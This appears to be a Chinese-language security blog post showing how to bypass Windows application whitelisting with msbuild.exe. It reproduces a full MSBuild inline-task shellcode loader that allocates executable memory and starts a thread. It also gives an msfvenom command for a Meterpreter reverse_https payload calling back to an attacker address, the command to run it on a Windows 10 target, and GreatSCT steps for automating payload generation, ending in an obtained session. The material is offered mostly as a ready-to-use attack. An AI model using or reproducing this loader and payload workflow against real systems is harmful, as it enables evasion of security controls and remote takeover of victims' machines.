---
title: GreatSCT | MSF  | 白名单
date: 2018-01-04 19:32:19
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->
Github https://github.com/GreatSCT/GreatSCT
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/GreatSCT.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

## 1.简介
Casey Smith 发现了一个名为“msbuild.exe”的微软二进制文件。他在2016年9月13日星期二写了一篇博客，标题为“使用MSBuild.exe绕过应用程序白名单 - 设备保护示例和缓解措施”。他的博客已经不存在了，但是你可以在这里通过archive.org访问它 https://web.archive.org/web/20161212224652/http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html

## 2.POC  -code

``` stylus

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
		    byte[] shellcode = new byte[] { INSERT_SHELLCODE_HERE };
		      
		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>
```
## 3.怎么运行的
这是Casey的博客文章的直接引用。这很简单，“msbuild.exe”会为你运行C＃代码。
事实证明，MSBuild.exe有一个内置的功能，称为“内联任务”。这些是可以用来丰富C＃构建过程的C＃代码片段。  本质上，这是做一个XML文件，在目标的内存中编译和执行，所以它不是传统的图像/模块执行事件。


## 4.MSF & MSBuild.exe
使用metasploit通过以下命令生成C＃shellcode：

``` stylus
msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 -f csharp
```
![enter description here][2]

在msfconsole中启动你的metasploit监听器。将您的“msbuild.exe”xml文件复制到目标系统。就我而言，这是Windows 10 Enterprise。使用以下命令执行有效内容

``` stylus
“C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe shellcode.xml”.
```
![enter description here][3]

![enter description here][4]
&nbsp;


## 5.自动化生成PAYLOAD
我们将使用GreatSCT来生成一个“msbuild.exe”有效载荷。
``` stylus
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT
python3 ./gr8sct.py
```
&nbsp;
按任意键开始
![enter description here][5]
&nbsp;
选择选项编号“0”，然后按回车。
![enter description here][6]
&nbsp;
![enter description here][7]
填写 IP

![enter description here][8]
得到会话
![enter description here][4]
原文链接 ：https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/

  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/C748EF6C45A33504B55D8087C89D45BA.png
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/msbuild_shellcode.png
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1515068611515.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1515068637863.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1515068898960.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/greatsct_msbuild_select.png
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1515069148854.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1515069394562.jpg 